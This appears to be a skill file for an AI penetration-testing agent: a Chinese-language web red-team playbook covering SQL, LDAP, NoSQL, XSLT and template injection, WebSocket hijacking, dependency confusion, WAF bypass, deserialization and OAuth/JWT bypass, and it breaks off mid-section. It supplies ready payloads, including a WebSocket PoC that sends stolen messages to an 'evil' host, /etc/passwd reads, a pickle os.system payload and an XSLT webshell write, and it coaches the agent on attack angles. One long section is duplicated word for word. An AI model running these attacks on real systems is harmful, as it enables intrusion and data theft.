---
name: web
description: 大爱仙尊·假设作业长文（web）。先专卡后读本文。
---

> 作业先走 Skill `智慧蛊` / `core_web_surface_probe.py`。本文件是长文速查，不替代专卡。

# Web Pentest

> 仅在根路由选择本目录后读取。每个条目都是待验证的检查假设；执行前用当前一手证据确认适用性。

**触发**: 目标是 Web/API/GraphQL/WebSocket/前端应用或 AI 服务。

## 领域决策直觉

1. 每个操作必须回答：这个操作如何帮我拿到数据或服务器权限？DoS、XSS 弹窗、纯信息泄露不在红队目标内
2. 鉴权绕过 > 注入 > 文件读取 > 信息泄露——按"能否直接拿到数据/权限"排序
3. 每个失败响应都是新信号：403=端点存在、WAF拦截=payload触达、超时=可能存在盲注
4. 外网打点优先级：多网卡主机（跨网段跳板）> 弱口令（直接利用无不确定性）> 已知漏洞（需 exploit 验证）> Web 应用
5. 非生产环境优先打（uat/dev/staging/pre）——防护通常比生产低 2-3 个量级，常直暴源站、默认口令、鉴权缺失
6. OA/邮件/堡垒机是最高效打点入口，护网实战中占比 >60%——每个都有专项武器库，不是通用扫描器能覆盖的
7. 15 分钟规则：单目标 15 分钟内无突破 → 切下一个，不恋战

## Discovery：漏洞发现

### API 参数 Fuzzing
- **信号**: REST API / OpenAPI 文档 / Swagger / WebSocket
- **假设**: 存在未文档化端点、隐藏参数或鉴权差异
- **验证**: 从 OpenAPI 构建路由词表 → Kiterunner API 路由级精确爆破（含 method/header/path）→ `/api/v2/admin → /api/v1/admin` 降级绕过新版鉴权 → deprecated 端点优先 → HTTP Method 切换（GET/POST/PUT/PATCH/DELETE 对比）→ headless browser paramFuzzer 提取动态参数 → Backslash-Powered-Scanner 注入反斜杠/null 字节探测解析器差异
- **证实**: 发现非文档化端点或 method 切换导致鉴权差异
- **升级**: 新端点/参数 → 注入探测 → 鉴权测试

### GraphQL 13 维攻击面
- **信号**: 目标使用 GraphQL 且内省查询未禁用
- **假设**: 内省泄露完整 schema + 存在查询深度/批处理/订阅等攻击面
- **验证**: GQLHound 被动编目（零主动请求）→ GraphQL Cop 提取全部类型+字段+参数 → 重点测试：Introspection 泄露 / 别名过载 / 字段重复 / 指令过载 / 批处理攻击 / mutation over GET CSRF / 订阅 WebSocket 劫持 / 接口联合类型绕过 / field suggestions 推断隐藏字段 / tracing debug 检测 → 跳过 DoS 类（循环查询/深度嵌套），聚焦数据泄露和鉴权绕过
- **证实**: 内省返回完整 schema 含管理员字段或 mutation
- **升级**: 敏感 mutation/字段 → 鉴权绕过测试 → 数据窃取

### SQL 注入方法论（Web 核心，现有覆盖最薄）
- **信号**: 任何带数据库的参数（搜索/排序/登录/ID 查询）；先确认注入点再定数据库类型
- **ORDER BY 二分法定列数**: `ORDER BY 10→5→8→6→7`；⚠️ N 成功 ≠ 列数 N，必须找到 N+1 失败的边界
- **UNION 6 变体穷尽**后才放弃: 空原查询、NULL 代替数字、`#`/`-- -` 注释、大小写、回显位定位（数字出现位置）、查完整 HTML 源码（数字可能在隐藏元素）
- **报错注入优先序**: EXTRACTVALUE（32 字符截断陷阱，必须脚本自动分段拼接非手动 SUBSTRING）→ UPDATEXML → floor+rand → exp()（MySQL 5.5.5-5.5.49）→ BIGINT `!(SELECT*FROM(...)a)-~0`
- **数据库差异**: MSSQL `1=CONVERT(int,@@version)`、PostgreSQL `1=CAST(version() AS int)`、Oracle `UTL_INADDR.GET_HOST_ADDRESS()`（见 database.md Oracle 节）
- **POST 参数完整性**: 必须含 submit 按钮（PHP `isset($_POST['submit'])`），注入 `'` 与正常值响应相同 = 缺参数
- **盲注**: 布尔/时间/报错三分；OOB 优先 DNS（`LOAD_FILE(CONCAT('\\\\',(SELECT...),'.dnslog.cn\\a'))`）
- **证实**: 提取数据 / OOB 回调
- **升级**: 拖库 → 凭据横向

### WebSocket 攻击（CSWSH / Socket.IO）
- **信号**: 目标使用 WebSocket 通信（`ws://`/`wss://`）、Socket.IO（`/socket.io/`）、GraphQL 订阅
- **CSWSH**（跨站 WebSocket 劫持）: 握手携带 Cookie + Origin 未校验 → 跨站 `new WebSocket("wss://target/ws")` 窃取消息（PoC: `<script>ws=new WebSocket("wss://t/ws");ws.onmessage=ev=>fetch('https://evil/?d='+ev.data)</script>`）
- **Socket.IO 协议**: 消息格式 `42["event",{data}]`（4=message，2=event）；先 HTTP 轮询再升级 `/socket.io/?EIO=4&transport=polling`；可连 `/admin` namespace 试管理功能；握手认证但消息级不检查权限
- **WS 消息注入**: JSON action 字段 SQLi/命令注入/SSTI
- **证实**: 跨站 WebSocket 窃取消息 / 未授权 namespace 访问
- **升级**: 消息窃取 → 会话劫持；WS 注入 → 命令执行

### 供应链攻击
- **信号**: 目标开源项目使用 npm/PyPI/Go/Ruby 包管理器或 GitHub Actions CI/CD
- **假设**: 私有包名可在公共注册表抢注（依赖混淆）或 CI/CD 配置存在漏洞
- **验证**: 扫描 package.json/requirements.txt 识别私有包名 → 跨 npm/PyPI/Ruby/Go/NuGet/crates.io 6 个注册表检查是否可公开注册 → OOB 回调确认 → poutine 扫描 GitHub Actions/GitLab CI pull_request_target 滥用 → Harden-Runner 监控 CI runner 网络外联 → **CI/CD 制品泄露**：Octoscan 解析 workflow YAML 中 `upload-artifact` 路径，检测 `.git/config`/环境文件/构建输出等敏感制品 → **repo-jacking**：检测 workflow 中引用的外部 Action 是否来自未注册的 GitHub 组织/用户（可抢注后投毒）
- **证实**: 私有包可公开注册 + OOB 收到目标环境的 DNS/HTTP 回调
- **升级**: 依赖混淆成功 → 内网 RCE → 横向移动

### ORM Leaking（无 SQLi 的跨框架数据推断）
- **信号**: 搜索/过滤功能返回不同响应模式，底层使用 ORM（Django/Prisma/Beego/Entity Framework/OData）
- **假设**: 通过 ORM 关系遍历可达任意关联模型的敏感字段，利用比较操作符逐字符推断
- **验证**: 三阶段——(1) 入口点发现：semgrep 规则扫描 qs.Filter(pattern) / filter(**user_dict) / Prisma where / EFCore OData $filter 模式 (2) 关系穿越：利用 ORM 的关联字段表示法（Django `user__password__startswith` / Beego `email__password__startswith` 解析 bug / Prisma `{"resetToken": {"not": "E"}}` 对象注入）(3) 逐字段推断：利用 `gt`/`lt`/`startswith` 等比较操作符做二分搜索逐字符提取，用响应差异/ReDoS(MySQL)/时间盲注(plormber) 作为 Oracle
- **证实**: 通过 ORM 过滤条件推断出其他表的敏感字段值，零 SQL 注入
- **升级**: 数据泄露 → 跨表遍历 → 凭据字段 → 横向移动
- **关键差异**: 这不是 SQL 注入——payload 全部是合法的 ORM 查询。AI 只会想到 SQLi，不会想到 ORM 关系穿越 + 比较操作符二分提取

### IDOR / 越权（对象级授权）
- **信号**: API 用数字/顺序 ID（`/api/order/12345`、`/user?id=100`）、Burp 历史含资源 ID 参数
- **假设**: 服务端未校验资源归属，替换 ID 可访问他人数据
- **验证**: 基线请求（自己资源）→ 批量替换 ID 参数（顺序/枚举/UID 字典）→ 多线程并发 → 状态码差异 + 响应长度差异（>200B）双重异常检测 → 重点测"查询密码/搜索参数"类 IDOR（如 `search-order-by-sn` 忽略 `search_pwd` 直接查订单）
- **证实**: 访问到他人订单/卡密/用户数据/验证码
- **升级**: 全量拖取 → 卡密/凭据泄露 → 账户接管
- **工具**: idor_scanner（Burp 请求文件直输入 + 基线对比 + 15 线程并发）
- **AI 盲区**: 模型会测普通 ID 替换，但不会主动找"查询类接口缺少查询密码/鉴权参数"的隐藏 IDOR 面

---

## Exploitation：漏洞利用

### 递归请求利用（Recursive Request Exploits — RRE）
- **信号**: 多步骤 API 流程（认证/支付/SSO），其中步骤 N 的响应字段作为步骤 N+1 的输入参数
- **假设**: API 流程的状态机可以通过递归请求图遍历找到鉴权缺口，输出一端的 token 可能在另一端被接受
- **验证**: 用 Burp 插件（DEF CON 33 工具）构建 API 调用图 → 标记每步的响应字段作为下一跳的输入参数 → 递归遍历所有可能的请求链 → 寻找"步骤 B 的 token 被步骤 D 接受"的交叉鉴权漏洞 → 测试将低权限步骤的输出作为高权限步骤的输入
- **证实**: 使用普通用户的 token 通过管理员专属步骤，或跳过支付步骤直接完成订单
- **升级**: 鉴权绕过 → 越权数据访问 → 权限提升

### Delimiter Smuggling（分隔符走私——跨组件解析不一致）
- **信号**: 多组件软件栈（前端代理 → 应用服务器 → 后端处理器），各层解析器不同
- **假设**: 不同软件组件对分隔符（命令分隔符/字段终止符/字符串边界）的解释存在差异，一个组件看到数据，另一个看到命令
- **验证**: 映射目标栈中每个解析器边界 → 对每个边界注入其规范中定义的所有分隔符类型 → 观察哪一层执行了本应被上一层过滤的操作 → 沿着不一致链级联多个分隔符走私最终达到 RCE
- **证实**: 一个组件将构造的分隔符视为无害数据，另一个组件将其解释为命令终止符并执行后续内容
- **升级**: 认证绕过 → 命令注入 → RCE → 服务器控制
- **AI 盲区**: AI 知道单个解析器的边缘情况，但不会主动去攻击"不同解析器之间的分隔符语义差异"这个交叉层

### WAF 绕过 8 种策略
- **信号**: WAF/IDS 阻断攻击 Payload
- **假设**: WAF 规则存在编码/解析/语义盲区
- **验证**: 按序尝试——(1) HTTP 参数污染 HPP `?id=1&id=2' OR 1=1--` (2) 参数分片 HPF——拆分到多个同名参数 (3) 请求体填充大量垃圾超检测上限 (4) EBCDIC/IBM500 编码绕过 (5) UTF-16BE 编码绕过 XXE (6) 直接向源站 IP 发送绕过 WAF (7) 白名单合法字符串包裹 Payload (8) 正则逆向工程——逐步替换关键字探测 WAF 规则 (and→||、空格→%0b、'→0x hex、substr→lpad)
- **证实**: 原被阻断的 Payload 成功到达后端
- **升级**: WAF 已绕过 → 完整漏洞利用

### WAF 指纹识别（9 维检测引擎）
- **信号**: 目标响应头含 `Server: cloudflare`/`X-Sucuri-ID`/`via: 1.1 google` 等，或 403 页带厂商标识
- **验证**（waf检测技能 260+ 指纹库精华）:
  1. **响应头指纹**: Cloudflare（`server: cloudflare` + `cf-ray`）/ Sucuri（`X-Sucuri-ID`）/ Akamai（`X-Akamai-Transformed`）/ Imperva（`X-CDN: Imperva`）/ FortiWeb（`Server: FortiWeb`）/ 安全狗（`X-Powered-By: WAF`）等
  2. **Cookie 指纹**: Cloudflare `__cf_bm` / Sucuri `sucuri_cloudproxy` / F5 `TSxxxx`（BIG-IP）/ Akamai `_abck` / DataDome `datadome` / Barracuda `barra_counter` 等
  3. **拦截状态码**: Cloudflare **1020**（独有）/ ModSecurity 406 / Azure 200+拦截页 / 华为云 **418** / 阿里云 405 / Akamai 302 JS Challenge / F5 200+拦截页 / AWS 405
  4. **响应体拦截内容**: 匹配 `Access Denied`/`Request blocked`/`cf-error-details`/`WAF`/`safedog`/`yunsuo` 等特征串
  5. **HTML 标题**: `Attention Required! | Cloudflare` / `网站防火墙` / `安全拦截` 等
  6. **主动探测 Payload**（见下表）
  7. **行为指纹**: 空字节 `%00` 截断（旧 ModSecurity/国产）/ `Transfer-Encoding: chunked` 无效数据（Nginx WAF 直接拒）/ `OPTIONS`/`PROPFIND`/`TRACE` 容忍度 / HTTP/1.0 降级 / 10MB 大请求体（Cloudflare 100MB vs AWS 128KB）/ JA3 指纹（Cloudflare 强制 TLS1.2+）
  8. **WAF IP 段与 ASN**: 对比已知 CDN/WAF 段（Cloudflare/Akamai/阿里云/腾讯云段）
  9. **响应时间差异**: 正常 vs 攻击请求延迟差 50-300ms（Cloudflare +50-150ms / 阿里云 +100-300ms / 长亭 +100-200ms）
- **主动探测表**: SQLi `?id=1' OR 1=1--` / XSS `?q=<script>alert(1)</script>` / LFI `?file=../../../../etc/passwd` / CMD `?cmd=;cat /etc/passwd` / CF 空字节 `%00` → 1020 / ModSecurity `union select 1,2,3` → 406 / 阿里云 `?q=../../../etc/passwd` → 405 / 长亭 `/**/union/**/select` → 403 / 安全狗 URL 编码 → 403 + safedog 头
- **误报消除**: 纯 CDN（仅缓存无 WAF）匹配到缓存头必须降级置信度；有 `X-WAF`/拦截页头才确认 WAF 启用
- **证实**: 识别出具体 WAF 厂商/版本
- **升级**: 选对应厂商绕过策略（下方）

### WAF 厂商专项绕过（2026）
- **Cloudflare**: 分块传输 `Transfer-Encoding: chunked` + `--data-binary $'3\r\nid\r\n1\r\n0\r\n\r\n'` / 缓存投毒 `X-Forwarded-Host: evil.com` / 找源站 IP（见 recon.md CDN 溯源矩阵）/ HTTP/3 QUIC（WAF 只查 TCP）
- **AWS WAF**: 内网 IP 伪造 `X-Forwarded-For: 127.0.0.1` + `X-Real-IP: 10.0.0.1` / 请求体超 128KB 默认限制（multipart 大文件）/ Lambda@Edge 超时窗口
- **ModSecurity**: 注释 `/**/union/**/select/**/` / 内联注释 `/*!50000union*/` / 双重编码 `%2527` / CRS 变量注入 `$(cat /etc/passwd)`
- **阿里云 WAF**: 宽字节 `%bf%27` / 分块+编码混合 / 直接访问源站 IP（阿里云 WAF 只挡 DNS 流量）
- **Imperva**: multipart 表单拆分（`-F "sql=1' OR '1'='1"`）/ 编码变体
- **F5 ASM**: `X-Cnection: close` 头混淆 / 拦截状态码 200+JS challenge 绕过
- **国产（安全狗/云锁/知道创宇）**: 大小写+URL 编码组合 / `%0a`/`%09` 空白变体 / 分块编码 / 行为分片（把 payload 拆到多个请求）
- **腾讯云 WAF**: `and 1=1` SQLi 变体 / 编码绕过

### 协议层 WAF 绕过（2026）
- **HTTP/2 降级走私**: H2 头含 `\r\n` 降级到 H1 变请求拆分（见请求走私条目）
- **WebSocket 升级**: `Connection: Upgrade` + `Upgrade: websocket` → 升级后 WAF 停止检查 → 隧道内走私 HTTP 请求
- **gRPC**: `Content-Type: application/grpc` + 二进制帧绕过文本规则；gRPC-web 降级走私
- **HTTP/3 QUIC**: UDP 流量多数 WAF/IPS 完全盲区 → 直接绕过
- **Line Folding / Header 混淆**: 头名大小写、`Transfer-Encoding : chunked`（空格）、垂直制表符 `\x0b`
- **Hop-by-hop 头**: `Connection: X-Forwarded-For` 让代理剥离内网伪造头
- **验证码/CAPTCHA 绕过**: 语义分割 OCR / 打码平台 / 重放旧验证码 / 并发竞态（见竞态条目）

### 反序列化攻击矩阵
- **信号**: Content-Type: application/x-java-serialized / Cookie 含 base64 序列化数据 / PHP unserialize 入口 / .NET BinaryFormatter / `pickle.loads` / `yaml.load` / `jsonpickle.decode`
- **假设**: 反序列化入口可触发 RCE
- **验证**: Java——URLDNS 无依赖 OOB 检测 → C3P0+JNDI → Click1 Apache Click → Jackson+H2 JDBC → Marshalsec 覆盖 JsonIO/Kryo/Red5AMF/SnakeYAML/XStream。PHP——PHAR+JPEG 多语言文件（JPEG 头 + PHAR stub）→ 引用注入 R:2 绕过随机 SecretCode → 布尔类型混淆 b:1。.NET——TypeConfuseDelegateGenerator 绕过 .NET 4.8+ → BaseActivationFactory/.NET 5/6/7 WPF 链。**Python**——pickle 反序列化即执行 PVM 虚拟机的 opcode：`__reduce__()` 返回 `(callable, args)` 直接以 `callable(*args)` 执行 → 基础 payload `class Exp: def __reduce__(self): return (os.system, ("id",))` → 过滤时手写 opcode（`cos`/`system`/`(S'id'`/`oR`，用 `pickletools.dis()` 分析）→ 沙箱绕过：白名单内找跳板（`builtins.getattr`→`builtins.eval`、`pydoc` 模块间接拿 os）、`getattr` 拼接模块名绕关键词 → `yaml.load`（旧版默认 Loader）可构造任意对象 `!!python/object/apply:os.system ["id"]`
- **证实**: OOB DNS/HTTP 回调确认命令执行
- **升级**: Shell 已获 → 稳定化 → 后渗透

### 表达式注入（EL/SPEL/OGNL）
- **信号**: Java 应用含 Spring/Struts2/自定义规则引擎，用户输入进入表达式解析器（`parseExpression`/`getValue`/参数绑定/标签属性）
- **假设**: 用户输入被当成表达式语言执行 → 访问对象图、调静态方法、命令执行
- **验证**:
  1. **SpEL（Spring）**: 输入进入 `SpelExpressionParser.parseExpression()` → 访问属性/调方法/引用 Bean/构造对象/调静态方法 → 触达 `Runtime`/`ProcessBuilder` 即 RCE；常见于数据绑定、注解配置、规则引擎、`@Value`、低代码平台
  2. **OGNL（Struts2）**: Struts2 参数绑定/标签属性求值/异常消息/重定向中的表达式求值 → 访问 `ValueStack`/`ActionContext` → 修改成员访问控制/排除列表绕过限制 → RCE；历史 Confluence/XWork 生态同类
  3. **EL（JSP/JSF）**: `${...}` 表达式注入 → 访问隐式对象 → 有限 RCE（视版本沙箱）
- **绕过**: 黑名单只过滤关键类名 → 字符串拼接、对象间接访问（`getClass()`→`forName`）、反射调用规避关键字检测
- **证实**: 表达式执行返回命令输出 / 读取应用配置
- **升级**: RCE → 服务器控制；或读取 Spring 容器 Bean/配置 → 敏感信息
- **AI 盲区**: 模型会测模板注入（SSTI），但不会主动区分 Java 三大表达式语言（SpEL/OGNL/EL）各自的解析入口和对象图攻击面

### Fastjson AutoType 绕过方法体系（1.x + 2.x）

> Java 生态最广泛使用的 JSON 库（Spring Boot 默认、dubbo/rocketmq 标配）。核心方法论：利用类型系统的"合法"机制绕过黑/白名单。

- **信号**: `Content-Type: application/json` + `@type` 关键字

**1.x 经典技巧（EOL）**：`[`/`{` 包裹 `@type` / `\x` hex 编码类名 / `expectClass` 组合 / Marshalsec

**★ 1.x 最新链（CVE-2026-16723，2026.07）**：
`@JSONType` 注解被当作信任信号，注解处理路径绕过 AutoType。Spring Boot fat-JAR 被利用检索字节码。**不需 AutoType、不需 gadget 类、不需 JNDI**。Spring Boot 2/3/4 + JDK 8/11/17/21，单次 JSON 请求 RCE。EOL 无补丁，SafeMode 或迁移 2.x 缓解

**2.x 经典绕过面**：ObjectReader 多态 / JSONB 二进制格式 / `autoTypeFilter` 过宽

**★ 2.x 最新链（2026.07，≤ 2.0.62，PR #7695 已修复）**：
FNV-1a 哈希碰撞——`@type` 哈希与白名单匹配但**不做字符串等值验证**。构造碰撞 payload 指向恶意 URL，classloader 加载执行。AutoType 禁用状态下仍可触发。升级 2.0.63+ 或 SafeMode

**检测**：
```
{"@type":"java.net.Inet4Address","val":"dnslog.cn"}
```
- DNS 回连 → 按版本选利用链
- 无回连 + Spring Boot → 尝试 `@JSONType` 注解路径
- 无回连 + Fastjson2 → 尝试 FNV-1a 碰撞

- **证实**: OOB DNS + RCE
- **证伪**: 无回连 → 试注解路径/哈希碰撞/JSONB
- **升级**: RCE → Shell → 后渗透
- **AI 盲区**: 两条 2026.07 最新链核心都是"利用框架合法机制（注解信任/哈希优化）绕过安全检查"——可迁移方法论

### SSRF 完整升级链
- **信号**: 目标接受 URL 输入（webhook/图片代理/文件导入）
- **假设**: SSRF 可升级为云元数据窃取或内网 RCE
- **验证**: 协议枚举（gopher/dict/file/sftp）→ 8 种 IP 编码绕过（十进制 2130706433 / 十六进制 0x7f000001 / IPv4-mapped IPv6 / 八进制 / Unicode 同形字 / 短 IP 127.1 / URL 解析器差异）→ DNS 重绑定 rbndr TOCTOU → **盲 SSRF 转可见**：自引用重定向链逐步递增 3xx 状态码（301→302→...→310），应用层重定向处理在状态码 305+ 时崩溃并 dump 完整重定向 trace 含最终响应体 → SSRF → Redis 主从 RCE gopher 协议构造 Redis 通信 → 云元数据 169.254.169.254/latest/meta-data/
- **证实**: 成功读取内网服务响应或云元数据
- **升级**: 云凭证获取 → IAM 角色接管 → 云横向

### SSTI 沙箱逃逸
- **信号**: 用户输入被拼接到模板渲染且 {{7*7}} 返回 49
- **假设**: 模板引擎沙箱可通过内置对象遍历突破
- **验证**: `${{<[%'"}}%` 44+ 引擎 Polyglot 一次性探测 → 引擎指纹识别 → `__class__.__mro__` 遍历继承链 → `__subclasses__()` 找 os/popen 类 → RCE
- **证实**: 成功执行 `id` 或 `whoami`
- **升级**: Shell 已获 → 稳定化

### XXE 7 种变体 + SAML 签名绕过
- **信号**: XML 解析器未禁用外部实体或接受 XML 输入
- **假设**: XXE 可读取本地文件 / 发起 SSRF / 绕过 SAML 签名
- **验证**: 本地 DTD 文件滥用 Error-Based 回显 → XInclude 绕过 DOCTYPE 限制 → DOCX/XLSX/PPTX 内嵌 XXE → SVG XXE+SSRF → JSON→XML Content-Type 转换触发 → SAML Void Canonicalization——空规范化摘要 DSA-256("")=可预知值 + 四层链式攻击（属性污染/命名空间混淆/扩展点注入/Void Canonicalization）伪造 SAML 断言
- **证实**: 成功读取 /etc/passwd 或伪造 SAML 响应通过认证
- **升级**: 内网探测 / 任意用户冒充

### LDAP 注入（含 AD 属性枚举）
- **信号**: 登录接口用 LDAP 认证（`(&(uid=$input)(password=$pass))`）、LDAP 搜索/用户管理功能
- **认证绕过 payload**: 用户名 `*)(uid=*))(|(uid=*`、`admin)(&)`（`(&)` 恒真）、`admin)%00` NULL 截断（OpenLDAP 旧版）
- **实现差异（关键决策点）**: OpenLDAP 只执行第一个过滤器（宽松，注入成功率高）vs Microsoft AD 双过滤器直接报错（需严格闭合括号）、Oracle OID 严格解析
- **AD 属性注入 → 域渗透**: Kerberoastable `(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))`；AS-REP Roastable `(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))`（DONT_REQ_PREAUTH）；密码永不过期 `userAccountControl:...:=65536`；管理员 `adminCount=1`、`memberOf=*admin*`
- **盲注**: 通配符 `(uid=admin)(userPassword=a*)` 逐字符猜测；属性存在性 `(mail=*)`、`(sshPublicKey=*)`
- **证实**: 认证绕过 / 枚举到 AD 敏感属性
- **升级**: 认证绕过 → 帐户接管；AD 属性枚举 → 定向攻击（见 ad.md）

### NoSQL 注入
- **信号**: MongoDB 接收 JSON 查询参数且未做严格类型过滤（PHP `?pass[$ne]=1` 自动解析为数组 / Node.js Express+qs 解析为对象 / JSON 接口 `{"pass": {"$ne": 1}}`）
- **操作符注入认证绕过**: JSON `{"password":{"$ne":""}}` + URL 编码 `password[$ne]=`（Express qs 自动解析为对象，两种都要试）
- **盲注提取**: `{"$regex":"^a"}` 逐字符；`$where` JS: `{"$where":"function(){if(this.password.match(/^a.*/)){sleep(3000);return true;}return false;}"}`
- **版本坑**: MongoDB 8.0 起服务端 JS/$where deprecated，但 5.x-7.x 默认可用
- **跨集合**: `[{"$lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"leaked"}}]` 聚合管道注入
- **WAF 绕过**: `{"\u0024ne":""}` Unicode、`$not/$eq` 双重否定、Content-Type JSON↔form 切换
- **CouchDB**: `/_find` Mango `{"selector":{"password":{"$gt":null}}}`、未授权 `/_all_dbs`、design document 篡改
- **ObjectId 信息泄露**: 前 8 位 hex = Unix 时间戳 `507f1f77 → 2012-10-17T21:02:31Z`
- **证实**: 认证绕过 / 数据提取
- **升级**: 数据库控制 → 数据窃取（见 database.md MongoDB 节）

### XSLT 注入
- **信号**: XML 转换服务（XSLT 处理器，如 Java JAXP/.NET XslCompiledTransform/PHP XSLTProcessor）
- **处理器指纹**: `<xsl:value-of select="system-property('xsl:vendor')"/>` → Xalan/Saxon/libxslt/MSXML 分流
- **文件读取/SSRF**: `<xsl:copy-of select="document('/etc/passwd')"/>`、`document('http://attacker/ssrf')`、Windows `file:///c:/windows/win.ini`
- **文件写入 → RCE**: EXSLT `<exploit:document href="/tmp/evil.txt">`（extension-element-prefixes）
- **PHP RCE**（registerPHPFunctions 时）: `php:function('file_put_contents','/var/www/shell.php','<?php ...')`、`php:function('assert',...)`
- **Java RCE**: Xalan `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"` + `rt:getRuntime()` + `rt:exec()`
- **.NET RCE**: `xmlns:msxsl="urn:schemas-microsoft-com:xslt"` + `<msxsl:script language="C#">` Process.Start
- **决策要点**: 先 system-property 指纹，再选 document()/EXSLT/php:function/msxsl:script 路径；现代加固默认禁扩展，无 RCE 不代表 document()/XXE 不可用
- **证实**: 文件读取或 RCE
- **升级**: 内网探测 / RCE → 服务器控制

### JWT/SAML 认证绕过
- **信号**: 目标使用 JWT 或 SAML 认证
- **假设**: 算法混淆或签名验证存在缺陷
- **验证**: JWT——KID 路径遍历注入 → jws2pubkey 从两个 JWT 恢复 RSA 公钥 → RS256→HS256 密钥混淆 → 空签名 CVE-2020-28042。SAML——XML 签名包装 XSW1-XSW8 → XXE 签名绕过 → XSLT Transform 文件外带
- **证实**: 成功伪造任意用户 Token 或 SAML 断言
- **升级**: 任意用户冒充 → 管理员权限 → 数据访问

### OAuth 2.0 / SSO 攻击
- **信号**: 第三方登录/SSO 集成（`/oauth/authorize`、`/login/oauth`、`redirect_uri` 参数）
- **redirect_uri 绕过矩阵**: `https://target.com/callback/../evil`、`target.com/callback//evil.com`、`%00.evil.com`、`target.COM`（大小写）、`target.com:443@evil.com`、`eviltarget.com`（子串匹配）、零宽空格 `%E2%80%8B`、Unicode 同形字（Cyrillic 'a'）、十进制 IP `3232276995`、IPv6 `[::ffff:192.168.1.1]`
- **站内 Open Redirect 配合**（严格校验域名时）: `/redirect?url=`、`/SSO?RelayState=`、`/go?target=` 系列
- **state 缺失 CSRF**: 攻击者拿 code → 构造 callback 链接 → 账户绑定攻击者第三方账户
- **Token 泄露途径**: Referer、DNS（code 在 URL query）、Implicit flow fragment、日志
- **邮箱预关联账户接管**: 注册 `attacker@target.com`（后缀匹配）→ 在第三方平台改邮箱为受害者邮箱 → 受害者 OAuth 登录自动关联
- **证实**: 拿到 code/token 或账户接管
- **升级**: 账户接管 → 数据访问

### Web 密码学误用
- **信号**: Cookie/Token 为分组整数倍密文、`sign=md5(secret+data)` 形式签名、报错区分"填充错误"、源码含硬编码密钥
- **假设**: 开发者常见的密码学误用（编码当加密/ECB 模式/CBC 比特翻转/Padding Oracle/哈希长度扩展/弱随机/硬编码密钥）可导致数据篡改或认证绕过
- **验证**:
  1. **ECB 重排**: 密文长度是分组整数倍 → 修改明文前缀观察密文重复段 → 切块重排（把"普通用户"块替换为"管理员"块）
  2. **CBC 比特翻转**: 篡改第 N 块密文的某字节 → 可控翻转第 N+1 块明文的对应字节 → 经典场景 Cookie 密文 `role=0` → `role=1`（异或差值算好再改）
  3. **CBC Padding Oracle**: 服务端对"填充是否正确"给出可区分响应（报错/时间差异）→ 逐字节解密任意密文，甚至加密任意明文 → 实战案例：Shiro-721 的 rememberMe AES-CBC、ASP.NET ViewState；工具 `padbuster`
  4. **哈希长度扩展**: `sign = md5(secret + params)` 形式的签名 → 知道 `H(secret+data)` 和 secret 长度 → 可算出 `H(secret+data+padding+append)` 伪造合法签名；工具 `hashpump`、`hash_extender`；正确姿势用 HMAC 而非裸哈希拼接
  5. **弱随机**: 密码重置 token/Session ID/CSRF token 使用 `rand()`/`mt_rand()`/时间戳种子 → 收集样本建模预测；PHP `mt_rand` 种子泄露后全序列可预测
  6. **硬编码/默认密钥**: 代码/配置文件里的密钥 → 源码泄露即全线失守（Shiro-550 密钥硬编码）；框架默认值不改（JWT `secret`、Django `SECRET_KEY` 示例值）
  7. **编码当加密**: Base64/URL 编码放 Cookie/Token 中 → 攻击者解码改完再编码即可，JWT payload 同理
  8. **加密当签名/签名当加密**: 只加密不验签 → 可篡改（CBC 翻转、ECB 重排）；正确姿势 Encrypt-then-MAC 或 AEAD（AES-GCM）
- **证实**: 成功伪造 Cookie/Token/签名/篡改密文
- **升级**: 认证绕过 → 数据篡改 → 任意用户冒充
- **速查**: ECB 重排→padbuster / CBC 翻转→手算异或 / 长度扩展→hashpump / 弱随机→收集样本建模 / 硬编码→接信息泄露 / 编码当加密→JWT payload 解码

### Web 密码学误用
- **信号**: Cookie/Token 为分组整数倍密文、`sign=md5(secret+data)` 形式签名、报错区分"填充错误"、源码含硬编码密钥
- **假设**: 开发者常见的密码学误用（编码当加密/ECB 模式/CBC 比特翻转/Padding Oracle/哈希长度扩展/弱随机/硬编码密钥）可导致数据篡改或认证绕过
- **验证**:
  1. **ECB 重排**: 密文长度是分组整数倍 → 修改明文前缀观察密文重复段 → 切块重排（把"普通用户"块替换为"管理员"块）
  2. **CBC 比特翻转**: 篡改第 N 块密文的某字节 → 可控翻转第 N+1 块明文的对应字节 → 经典场景 Cookie 密文 `role=0` → `role=1`（异或差值算好再改）
  3. **CBC Padding Oracle**: 服务端对"填充是否正确"给出可区分响应（报错/时间差异）→ 逐字节解密任意密文，甚至加密任意明文 → 实战案例：Shiro-721 的 rememberMe AES-CBC、ASP.NET ViewState；工具 `padbuster`
  4. **哈希长度扩展**: `sign = md5(secret + params)` 形式的签名 → 知道 `H(secret+data)` 和 secret 长度 → 可算出 `H(secret+data+padding+append)` 伪造合法签名；工具 `hashpump`、`hash_extender`；正确姿势用 HMAC 而非裸哈希拼接
  5. **弱随机**: 密码重置 token/Session ID/CSRF token 使用 `rand()`/`mt_rand()`/时间戳种子 → 收集样本建模预测；PHP `mt_rand` 种子泄露后全序列可预测
  6. **硬编码/默认密钥**: 代码/配置文件里的密钥 → 源码泄露即全线失守（Shiro-550 密钥硬编码）；框架默认值不改（JWT `secret`、Django `SECRET_KEY` 示例值）
  7. **编码当加密**: Base64/URL 编码放 Cookie/Token 中 → 攻击者解码改完再编码即可，JWT payload 同理
  8. **加密当签名/签名当加密**: 只加密不验签 → 可篡改（CBC 翻转、ECB 重排）；正确姿势 Encrypt-then-MAC 或 AEAD（AES-GCM）
- **证实**: 成功伪造 Cookie/Token/签名/篡改密文
- **升级**: 认证绕过 → 数据篡改 → 任意用户冒充
- **速查**: ECB 重排→padbuster / CBC 翻转→手算异或 / 长度扩展→hashpump / 弱随机→收集样本建模 / 硬编码→接信息泄露 / 编码当加密→JWT payload 解码

### Cookie/Token 分析决策树
- **信号**: 拿到会话 Cookie/Token，先**解码分流再选攻击**，不要在错误类型上浪费时间
